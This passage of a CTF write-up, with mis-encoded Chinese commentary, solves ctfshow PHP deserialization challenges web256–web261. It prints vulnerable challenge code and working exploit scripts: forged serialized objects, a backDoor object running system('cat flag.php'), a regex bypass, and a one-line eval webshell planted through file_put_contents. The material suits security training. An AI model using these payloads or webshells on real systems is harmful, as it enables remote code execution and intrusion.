class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>å¤šäº†ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>é‡æ–°å®šä¹‰ä¸€ä¸‹username password</p>
<p>payload: username&#x3D;ctf&amp;password&#x3D;xxx</p>
<p><code>url=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A3%3A%22ctf%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22xxx%22%3B%7D</code></p>
<p>ctfshow{02a42717-ddee-45d2-964d-fde32fa618bf}</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//é­”æœ¯æ–¹æ³• é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚åœ¨ç±»å®ä¾‹åŒ–çš„æ—¶å€™,ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥é­”æœ¯æ–¹æ³•,è¿›è¡Œç±»çš„åˆå§‹åŒ–;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815338">https://blog.csdn.net/Jeff_12138/article/details/124815338</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__constructï¼šå®ä¾‹åŒ–å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼Œå…¶ä½œç”¨æ˜¯æ‹¿æ¥åˆå§‹åŒ–ä¸€äº›å€¼ã€‚</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™è¿‡æ»¤[<a href="https://so.csdn.net/so/search?q=oc&spm=1001.2101.3001.7020">oc</a>]æ˜¯åŒ¹é…oå­—ç¬¦æˆ–è€…cå­—ç¬¦ï¼Œ\dåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº[0-9]ï¼Œ+å·æ˜¯åŒ¹é…å‰é¢çš„\dä¸€æ¬¡æˆ–è€…å¤šæ¬¡ã€‚ä¸‹é¢åªéœ€è¦å°†O:11å˜æˆO:+11å°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"> &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web259åŸç”Ÿç±»åˆ©ç”¨"><a href="#web259åŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="web259åŸç”Ÿç±»åˆ©ç”¨"></a>web259åŸç”Ÿç±»åˆ©ç”¨</h2><p>ä¸ä¼š&#96;</p>
<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–åå«æœ‰ctfshow_i_love_36D</p>
<p>ç›´æ¥getä¼ å‚ctfshow_i_love_36Då³å¯</p>
<p>ctfshow{95f2cc54-4c24-4de1-a5ef-8bc52a47a174}</p>
<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password; </span><br><span class="line">    &#125; <span class="comment">//code èµ‹å€¼code=username</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;  <span class="comment">//å¼±ç±»å‹æ¯”è¾ƒcode=877+å­—ç¬¦</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()	 	//ä½¿ç”¨serializeï¼ˆï¼‰æ—¶è§¦å‘ </span><br><span class="line">__destruct() 	//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œåœ¨è„šæœ¬ç»ˆæ­¢æˆ–å¯¹è±¡å¼•ç”¨è®¡æ•°ä¸º0æ—¶è°ƒç”¨ï¼Œé€šå¸¸ä¼šæ‰§è¡Œæ•°æ®æ¸…é™¤å°±æˆ–è¿æ¥æ–­å¼€æ“ä½œ </span><br><span class="line">__call() 		//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ ï¼Œé€šå¸¸ç”¨äºé”™è¯¯å¤„ç†ï¼Œé˜²æ­¢è„šæœ¬å› ä¸ºè°ƒç”¨é”™è¯¯è€Œç»ˆæ­¢æ‰§è¡Œ</span><br><span class="line">__callStatic() 	//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__get() 		//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼Œé€šå¸¸ç”¨äºè®¾ç½®å’Œè·å–å¯¹è±¡ç§æœ‰å±æ€§</span><br><span class="line">__set() 		//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ï¼Œé€šå¸¸ç”¨äºè®¾ç½®å’Œè·å–å¯¹è±¡ç§æœ‰å±æ€§</span><br><span class="line">__isset() 		//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ </span><br><span class="line">__unset() 		//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ </span><br><span class="line">__invoke() 		//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br><span class="line">__clone()       //å½“æŠŠä¸€ä¸ªå¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨</span><br><span class="line">__wakeup()		//unserializeå‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨wakeupæ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨åˆ™å…ˆè°ƒç”¨wakeupæ–¹æ³•ï¼Œåšä¸€äº›å¿…è¦çš„åˆå§‹åŒ–è¿æ•°æ®åº“ç­‰æ“ä½œ</span><br><span class="line">__construct() 	//PHP5å…è®¸åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">__destruct()	  //PHP5å¼•å…¥ææ„å‡½æ•°çš„æ¦‚å¿µï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</span><br><span class="line">__toString()	  //ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯</span><br></pre></td></tr></table></figure>

<p>file_put_contents â€” å°†æ•°æ®å†™å…¥æ–‡ä»¶</p>
<p>å¦‚æœ <code>filename</code>   ä¸å­˜åœ¨ï¼Œå°†ä¼šåˆ›å»ºæ–‡ä»¶ã€‚åä¹‹ï¼Œå­˜åœ¨çš„æ–‡ä»¶å°†ä¼šé‡å†™ï¼Œé™¤éè®¾ç½®   <strong><code>FILE_APPEND</code></strong> flagã€‚  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//urlç¼–ç ä¸€ä¸‹getä¼ å‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯æœ¨é©¬</p>
<p>è¿æ¥url&#x2F;877.php</p>
<p>æ‰§è¡Œ1&#x3D;system(â€œls &#x2F;â€œ);</p>
<p>å‘ç°ctfshow{64baf76c-41a0-4795-922a-17076ed94eb2}</p>
